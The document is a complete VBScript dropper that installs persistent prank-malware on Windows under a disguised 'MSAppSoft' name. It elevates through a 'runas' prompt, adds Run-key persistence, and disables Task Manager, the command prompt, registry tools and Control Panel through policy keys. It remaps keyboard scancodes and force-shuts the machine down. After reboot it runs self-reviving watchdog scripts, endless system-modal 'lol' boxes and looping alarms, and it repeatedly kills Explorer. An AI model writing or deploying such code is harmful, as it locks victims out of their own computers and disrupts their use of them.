Option Explicit
Dim fso, sh, DEST, build, f, needElev, ie, ts

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
DEST  = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"
build = sh.ExpandEnvironmentStrings("%SystemDrive%") & "\ngsbuild"

' ---- elevation check ----
On Error Resume Next
Err.Clear
If Not fso.FolderExists(DEST) Then fso.CreateFolder DEST
Set f = fso.CreateTextFile(DEST & "\.wtest", True)
If Err.Number = 0 Then f.Close
needElev = (Err.Number <> 0)
On Error GoTo 0

If needElev Then
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
    WScript.Quit
End If

On Error Resume Next
fso.DeleteFile DEST & "\.wtest", True
On Error GoTo 0

If fso.FolderExists(build) Then fso.DeleteFolder build, True
fso.CreateFolder build

On Error Resume Next
Err.Clear

' ============================================================ Start.bat
Set ts = fso.CreateTextFile(DEST & "\Start.bat", True, False)
ts.WriteLine "@echo off"
ts.WriteLine "setlocal enabledelayedexpansion"
ts.WriteLine "title Start"
ts.WriteLine "set ""DEST=%~dp0"""
ts.WriteLine "cd /d ""%DEST%"""
ts.WriteLine ""
ts.WriteLine "set N=0"
ts.WriteLine "for /f %%c in ('tasklist /v /fi ""imagename eq cmd.exe"" 2^>nul ^| find /c /i ""Start""') do set N=%%c"
ts.WriteLine "if not defined N set N=0"
ts.WriteLine "if %N% GTR 1 exit /b"
ts.WriteLine ""
ts.WriteLine "if exist ""%DEST%\phase1.done"" goto phase2"
ts.WriteLine ""
ts.WriteLine "for /l %%i in (1,1,50) do call :mklol %%i"
ts.WriteLine "call :wall"
ts.WriteLine "call :cursor"
ts.WriteLine "call :colors"
ts.WriteLine "> ""%DEST%\phase1.done"" echo done"
ts.WriteLine "shutdown -s -f -t 0"
ts.WriteLine "exit /b"
ts.WriteLine ""
ts.WriteLine ":mklol"
ts.WriteLine "set ""FN=lol.txt"""
ts.WriteLine "if not ""%~1""==""1"" set ""FN=lol (%~1).txt"""
ts.WriteLine ">""%USERPROFILE%\Desktop\%FN%"" echo lol"
ts.WriteLine "if defined PUBLIC if exist ""%PUBLIC%\Desktop"" >""%PUBLIC%\Desktop\%FN%"" echo lol"
ts.WriteLine "exit /b"
ts.WriteLine ""
ts.WriteLine ":wall"
ts.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f"
ts.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v WallpaperStyle /t REG_SZ /d ""2"" /f"
ts.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v TileWallpaper /t REG_SZ /d ""0"" /f"
ts.WriteLine "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f"
ts.WriteLine "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v WallpaperStyle /t REG_SZ /d ""2"" /f"
ts.WriteLine "exit /b"
ts.WriteLine ""
ts.WriteLine ":cursor"
ts.WriteLine "reg add ""HKCU\Control Panel\Cursors"" /ve /t REG_EXPAND_SZ /d ""N (system scheme)"" /f"
ts.WriteLine "for %%a in (Arrow Help AppStarting Wait Crosshair IBeam NWPen No SizeNS SizeWE SizeNWSE SizeNESW SizeAll UpArrow Hand) do reg add ""HKCU\Control Panel\Cursors"" /v %%a /t REG_EXPAND_SZ /d ""%DEST%NCursor.cur"" /f"
ts.WriteLine "exit /b"
ts.WriteLine ""
ts.WriteLine ":colors"
ts.WriteLine "reg add ""HKCU\Control Panel\Colors"" /v ActiveTitle /t REG_SZ /d ""0 0 255"" /f"
ts.WriteLine "reg add ""HKCU\Control Panel\Colors"" /v GradientActiveTitle /t REG_SZ /d ""0 0 255"" /f"
ts.WriteLine "reg add ""HKCU\Control Panel\Colors"" /v InactiveTitle /t REG_SZ /d ""0 0 128"" /f"
ts.WriteLine "reg add ""HKCU\Control Panel\Colors"" /v TitleText /t REG_SZ /d ""255 255 255"" /f"
ts.WriteLine "reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v AccentColor /t REG_DWORD /d 4292114432 /f"
ts.WriteLine "reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v ColorizationColor /t REG_DWORD /d 3288365268 /f"
ts.WriteLine "reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"" /v ColorPrevalence /t REG_DWORD /d 1 /f"
ts.WriteLine "exit /b"
ts.WriteLine ""
ts.WriteLine ":phase2"
ts.WriteLine "if /i not ""%~1""==""resume"" ("
ts.WriteLine "    del ""%DEST%\hb1.tmp"" ""%DEST%\hb2.tmp"" ""%DEST%\lol.run"" 2>nul"
ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" notice"
ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" alarm"
ts.WriteLine ")"
ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEST%\bounce.ps1"")"
ts.WriteLine ")"
ts.WriteLine "if not exist ""%DEST%\lol.run"" ("
ts.WriteLine "    >""%DEST%\lol.run"" echo ."
ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" lol"
ts.WriteLine ")"
ts.WriteLine ""
ts.WriteLine ":loop"
ts.WriteLine ">""%DEST%\hb1.tmp"" echo ."
ts.WriteLine "tasklist /v /fi ""imagename eq cmd.exe"" 2>nul | find /i ""CheckSoft"" >nul || start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\CheckSoft.bat"""
ts.WriteLine "ping -n 6 127.0.0.1 >nul"
ts.WriteLine "goto loop"
ts.Close
If Err.Number <> 0 Then Die "Start.bat"

' ============================================================ CheckSoft.bat
Set ts = fso.CreateTextFile(DEST & "\CheckSoft.bat", True, False)
ts.WriteLine "@echo off"
ts.WriteLine "title CheckSoft"
ts.WriteLine "set ""DEST=%~dp0"""
ts.WriteLine "cd /d ""%DEST%"""
ts.WriteLine "set N=0"
ts.WriteLine "ping -n 3 127.0.0.1 >nul"
ts.WriteLine "for /f %%c in ('tasklist /v /fi ""imagename eq cmd.exe"" 2^>nul ^| find /c /i ""CheckSoft""') do set N=%%c"
ts.WriteLine "if not defined N set N=0"
ts.WriteLine "if %N% GTR 1 exit /b"
ts.WriteLine ":loop"
ts.WriteLine "del ""%DEST%\hb1.tmp"" 2>nul"
ts.WriteLine "del ""%DEST%\hb2.tmp"" 2>nul"
ts.WriteLine "ping -n 8 127.0.0.1 >nul"
ts.WriteLine "if not exist ""%DEST%\hb1.tmp"" start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\Start.bat"" resume"
ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEST%\bounce.ps1"")"
ts.WriteLine ")"
ts.WriteLine "taskkill /f /im explorer.exe >nul 2>nul"
ts.WriteLine "ping -n 4 127.0.0.1 >nul"
ts.WriteLine "tasklist /fi ""imagename eq explorer.exe"" 2>nul | find /i ""explorer"" >nul || start """" explorer.exe"
ts.WriteLine "ping -n 56 127.0.0.1 >nul"
ts.WriteLine "goto loop"
ts.Close
If Err.Number <> 0 Then Die "CheckSoft.bat"

' ============================================================ payload.vbs
Set ts = fso.CreateTextFile(DEST & "\payload.vbs", True, False)
ts.WriteLine "Option Explicit"
ts.WriteLine "Dim m, sh, fso, p, wav, cmd, i, ok"
ts.WriteLine "If WScript.Arguments.Count = 0 Then WScript.Quit"
ts.WriteLine "m = LCase(WScript.Arguments(0))"
ts.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
ts.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
ts.WriteLine "Select Case m"
ts.WriteLine "Case ""hide"""
ts.WriteLine "    If WScript.Arguments.Count < 2 Then WScript.Quit"
ts.WriteLine "    cmd = Chr(34) & WScript.Arguments(1) & Chr(34)"
ts.WriteLine "    For i = 2 To WScript.Arguments.Count - 1"
ts.WriteLine "        cmd = cmd & "" "" & Chr(34) & WScript.Arguments(i) & Chr(34)"
ts.WriteLine "    Next"
ts.WriteLine "    sh.Run cmd, 0, False"
ts.WriteLine "Case ""notice"""
ts.WriteLine "    MsgBox ""Reboot detected."" & vbCrLf & vbCrLf & ""Phase 2 begins. There is no escape."", vbInformation + vbSystemModal, ""NGsoft1.0"""
ts.WriteLine "Case ""lol"""
ts.WriteLine "    Do"
ts.WriteLine "        MsgBox ""lol"", vbExclamation + vbSystemModal, ""lol"""
ts.WriteLine "    Loop"
ts.WriteLine "Case ""alarm"""
ts.WriteLine "    On Error Resume Next"
ts.WriteLine "    wav = sh.ExpandEnvironmentStrings(""%SystemRoot%\Media\chord.wav"")"
ts.WriteLine "    If fso.FileExists(wav) Then"
ts.WriteLine "        Set p = CreateObject(""WMPlayer.OCX"")"
ts.WriteLine "        If Err.Number = 0 Then"
ts.WriteLine "            p.settings.setMode ""loop"", True"
ts.WriteLine "            p.URL = wav"
ts.WriteLine "            p.controls.play"
ts.WriteLine "            ok = True"
ts.WriteLine "        End If"
ts.WriteLine "    End If"
ts.WriteLine "    On Error GoTo 0"
ts.WriteLine "    If ok Then"
ts.WriteLine "        Do"
ts.WriteLine "            WScript.Sleep 1000"
ts.WriteLine "        Loop"
ts.WriteLine "    End If"
ts.WriteLine "    Do"
ts.WriteLine "        Beep"
ts.WriteLine "        WScript.Sleep 400"
ts.WriteLine "    Loop"
ts.WriteLine "End Select"
ts.Close
If Err.Number <> 0 Then Die "payload.vbs"

' ============================================================ bounce.ps1
Set ts = fso.CreateTextFile(build & "\bounce.ps1", True, False)
ts.WriteLine "Add-Type -AssemblyName System.Windows.Forms"
ts.WriteLine "Add-Type -AssemblyName System.Drawing"
ts.WriteLine "$HB = '" & DEST & "\hb2.tmp'"
ts.WriteLine "$W = 130; $H = 470"
ts.WriteLine "$f = New-Object System.Windows.Forms.Form"
ts.WriteLine "$f.FormBorderStyle = 'None'"
ts.WriteLine "$f.TopMost = $true"
ts.WriteLine "$f.BackColor = [System.Drawing.Color]::FromArgb(192,0,0)"
ts.WriteLine "$f.ClientSize = New-Object System.Drawing.Size($W,$H)"
ts.WriteLine "$f.StartPosition = 'Manual'"
ts.WriteLine "$f.ShowInTaskbar = $false"
ts.WriteLine "$l = New-Object System.Windows.Forms.Label"
ts.WriteLine "$l.Dock = 'Fill'"
ts.WriteLine "$l.ForeColor = [System.Drawing.Color]::White"
ts.WriteLine "$l.Font = New-Object System.Drawing.Font('MS Gothic',60,[System.Drawing.FontStyle]::Bold)"
ts.WriteLine "$l.TextAlign = 'MiddleCenter'"
ts.WriteLine "$l.Text = ""N`r`nG`r`n!`r`nN`r`nG`r`n!`r`nN`r`nG"""
ts.WriteLine "$f.Controls.Add($l)"
ts.WriteLine "$x = 120; $y = 120; $dx = 6; $dy = 4; $n = 0"
ts.WriteLine "$mx = [Math]::Max(0,[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - $W)"
ts.WriteLine "$my = [Math]::Max(0,[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height - $H)"
ts.WriteLine "$f.Left = $x; $f.Top = $y"
ts.WriteLine "$f.Show()"
ts.WriteLine "$sw = [System.Diagnostics.Stopwatch]::StartNew()"
ts.WriteLine "while ($f.Visible) {"
ts.WriteLine "    [System.Windows.Forms.Application]::DoEvents()"
ts.WriteLine "    if ($sw.ElapsedMilliseconds -ge 40) {"
ts.WriteLine "        $sw.Restart()"
ts.WriteLine "        $x += $dx; $y += $dy"
ts.WriteLine "        if ($x -lt 0) { $x = 0; $dx = -$dx } elseif ($x -gt $mx) { $x = $mx; $dx = -$dx }"
ts.WriteLine "        if ($y -lt 0) { $y = 0; $dy = -$dy } elseif ($y -gt $my) { $y = $my; $dy = -$dy }"
ts.WriteLine "        $f.Left = $x; $f.Top = $y"
ts.WriteLine "        $n++"
ts.WriteLine "        if (($n % 25) -eq 0) { try { Set-Content -LiteralPath $HB -Value '.' } catch {} }"
ts.WriteLine "    }"
ts.WriteLine "    Start-Sleep -Milliseconds 10"
ts.WriteLine "}"
ts.Close
If Err.Number <> 0 Then Die "bounce.ps1"

' ============================================================ ImNGsoft.sed
Set ts = fso.CreateTextFile(build & "\ImNGsoft.sed", True, False)
ts.WriteLine "[Version]"
ts.WriteLine "Class=IEXPRESS"
ts.WriteLine "SEDVersion=3"
ts.WriteLine "[Options]"
ts.WriteLine "PackagePurpose=InstallApp"
ts.WriteLine "ShowInstallProgramWindow=0"
ts.WriteLine "HideExtractAnimation=1"
ts.WriteLine "UseLongFileName=1"
ts.WriteLine "InsideCompressed=0"
ts.WriteLine "CAB_FixedSize=0"
ts.WriteLine "CAB_ResvCodeSigning=0"
ts.WriteLine "RebootMode=N"
ts.WriteLine "InstallPrompt=%InstallPrompt%"
ts.WriteLine "DisplayLicense=%DisplayLicense%"
ts.WriteLine "FinishMessage=%FinishMessage%"
ts.WriteLine "TargetName=%TargetName%"
ts.WriteLine "FriendlyName=%FriendlyName%"
ts.WriteLine "AppLaunched=%AppLaunched%"
ts.WriteLine "PostInstallCmd=%PostInstallCmd%"
ts.WriteLine "AdminQuietInstCmd=%AdminQuietInstCmd%"
ts.WriteLine "UserQuietInstCmd=%UserQuietInstCmd%"
ts.WriteLine "SourceFiles=SourceFiles"
ts.WriteLine "[Strings]"
ts.WriteLine "InstallPrompt="
ts.WriteLine "DisplayLicense="
ts.WriteLine "FinishMessage="
ts.WriteLine "TargetName=" & build & "\ImNGsoft.exe"
ts.WriteLine "FriendlyName=ImNGsoft"
ts.WriteLine "AppLaunched=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File bounce.ps1"
ts.WriteLine "PostInstallCmd=<None>"
ts.WriteLine "AdminQuietInstCmd="
ts.WriteLine "UserQuietInstCmd="
ts.WriteLine "FILE0=bounce.ps1"
ts.WriteLine "[SourceFiles]"
ts.WriteLine "SourceFiles0=" & build & "\"
ts.WriteLine "[SourceFiles0]"
ts.WriteLine "%FILE0%="
ts.Close
If Err.Number <> 0 Then Die "ImNGsoft.sed"

' ============================================================ bmp / cur
MakeBmp DEST & "\RedWallPaper.bmp"
If Err.Number <> 0 Then Die "RedWallPaper.bmp"
MakeCur DEST & "\NCursor.cur"
If Err.Number <> 0 Then Die "NCursor.cur"

' ============================================================ copy + assemble
fso.CopyFile build & "\bounce.ps1", DEST & "\bounce.ps1", True
If Err.Number <> 0 Then Die "copy ps1"

ie = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\iexpress.exe"
If Not fso.FileExists(ie) Then ie = "iexpress"
sh.CurrentDirectory = build
sh.Run """" & ie & """ /n /q """ & build & "\ImNGsoft.sed""", 0, True
If Not fso.FileExists(build & "\ImNGsoft.exe") Then
    sh.Run """" & ie & """ /n """ & build & "\ImNGsoft.sed""", 1, True
End If
If fso.FileExists(build & "\ImNGsoft.exe") Then
    fso.CopyFile build & "\ImNGsoft.exe", DEST & "\ImNGsoft.exe", True
End If

' ============================================================ registry
Dim PS, PE, HS, HE, RK, KL
PS = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
PE = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
HS = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"
HE = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
RK = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
KL = "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout"

sh.RegWrite PS & "\DisableTaskMgr", 1, "REG_DWORD"
sh.RegWrite HS & "\DisableTaskMgr", 1, "REG_DWORD"
sh.RegWrite PS & "\DisableCMD", 2, "REG_DWORD"
sh.RegWrite HS & "\DisableCMD", 2, "REG_DWORD"
sh.RegWrite PS & "\DisableRegistryTools", 1, "REG_DWORD"
sh.RegWrite HS & "\DisableRegistryTools", 1, "REG_DWORD"
sh.RegWrite PS & "\NoDispBackgroundPage", 1, "REG_DWORD"
sh.RegWrite HS & "\NoDispBackgroundPage", 1, "REG_DWORD"
sh.RegWrite PS & "\NoChangingWallpaper", 1, "REG_DWORD"
sh.RegWrite HS & "\NoChangingWallpaper", 1, "REG_DWORD"
sh.RegWrite PS & "\NoDispAppearancePage", 1, "REG_DWORD"
sh.RegWrite HS & "\NoDispAppearancePage", 1, "REG_DWORD"
sh.RegWrite PE & "\NoControlPanel", 1, "REG_DWORD"
sh.RegWrite HE & "\NoControlPanel", 1, "REG_DWORD"
sh.RegWrite PE & "\NoViewContextMenu", 1, "REG_DWORD"
sh.RegWrite HE & "\NoViewContextMenu", 1, "REG_DWORD"
If Err.Number <> 0 Then Die "policies"

sh.RegWrite KL & "\Scancode Map", Array(0,0,0,0, 0,0,0,0, 6,0,0,0, &H22,0,&H31,0, &H31,0,&H22,0, &H18,0,&H26,0, &H26,0,&H18,0, 0,0,&H3A,0, 0,0,0,0), "REG_BINARY"
If Err.Number <> 0 Then Die "Scancode Map"

sh.RegWrite RK & "\MSAppSoft", "wscript.exe """ & DEST & "\payload.vbs"" hide """ & DEST & "\Start.bat"""
sh.RegWrite RK & "\MSAppSoftChk", "wscript.exe """ & DEST & "\payload.vbs"" hide """ & DEST & "\CheckSoft.bat"""
If Err.Number <> 0 Then Die "Run"

sh.Run "rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True

' ============================================================ verify
Dim miss
miss = ""
If Not fso.FileExists(DEST & "\Start.bat") Then miss = miss & "Start.bat" & vbCrLf
If Not fso.FileExists(DEST & "\CheckSoft.bat") Then miss = miss & "CheckSoft.bat" & vbCrLf
If Not fso.FileExists(DEST & "\payload.vbs") Then miss = miss & "payload.vbs" & vbCrLf
If Not fso.FileExists(DEST & "\bounce.ps1") Then miss = miss & "bounce.ps1" & vbCrLf
If Not fso.FileExists(DEST & "\RedWallPaper.bmp") Then miss = miss & "RedWallPaper.bmp" & vbCrLf
If Not fso.FileExists(DEST & "\NCursor.cur") Then miss = miss & "NCursor.cur" & vbCrLf
If miss <> "" Then MsgBox "Missing files in " & DEST & vbCrLf & vbCrLf & miss, vbExclamation, "gen.vbs"

' ============================================================ cleanup + run
fso.DeleteFolder build, True
sh.Run "cmd /c """ & DEST & "\Start.bat""", 0, False

' ============================================================ parts
Sub Die(what)
    MsgBox "Failed at: " & what & vbCrLf & vbCrLf & _
           "Error " & Err.Number & " (line " & Err.Line & ")" & vbCrLf & _
           Err.Description, vbCritical, "gen.vbs"
    WScript.Quit
End Sub

Sub MakeBmp(path)
    Dim st, row, i
    row = String(1024, Chr(0)) & String(1024, Chr(0)) & String(1024, Chr(255))
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2
    st.Charset = "iso-8859-1"
    st.Open
    st.Write "BM" & L32(54 + 1024*768*3) & L32(0) & L32(54) & L32(40) & L32(1024) & L32(768) & _
             Chr(1) & Chr(0) & Chr(24) & Chr(0) & L32(0) & L32(1024*768*3) & L32(2835) & L32(2835) & L32(0) & L32(0)
    For i = 1 To 768
        st.Write row
    Next
    st.SaveToFile path, 2
    st.Close
End Sub

Sub MakeCur(path)
    Dim st, y, s
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2
    st.Charset = "iso-8859-1"
    st.Open
    st.Write Chr(0) & Chr(0) & Chr(2) & Chr(0) & Chr(1) & Chr(0)
    st.Write Chr(32) & Chr(32) & Chr(0) & Chr(0) & L16(16) & L16(16) & L32(304) & L32(22)
    st.Write L32(40) & L32(32) & L32(64) & Chr(1) & Chr(0) & Chr(1) & Chr(0) & L32(0) & L32(256) & L32(0) & L32(0) & L32(0) & L32(0)
    st.Write Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(255) & Chr(255) & Chr(255) & Chr(0)
    For y = 0 To 31
        s = String(32, ".")
        If y >= 13 And y <= 18 Then s = String(32, "#")
        Mid(s, 15, 4) = "####"
        st.Write RowBits(s)
    Next
    For y = 0 To 31
        s = String(32, ".")
        If y >= 13 And y <= 18 Then s = String(32, "#")
        Mid(s, 15, 4) = "####"
        st.Write RowBits(s)
    Next
    st.SaveToFile path, 2
    st.Close
End Sub

Function RowBits(s)
    Dim c, v, k, acc
    acc = ""
    For k = 1 To 4
        v = 0
        For c = 0 To 7
            v = v * 2
            If Mid(s, (k-1)*8 + c + 1, 1) = "." Then v = v + 1
        Next
        acc = acc & Chr(v)
    Next
    RowBits = acc
End Function

Function L16(n)
    L16 = Chr(n And 255) & Chr((n\256) And 255)
End Function

Function L32(n)
    L32 = Chr(n And 255) & Chr((n\256) And 255) & Chr((n\65536) And 255) & Chr((n\16777216) And 255)
End Function
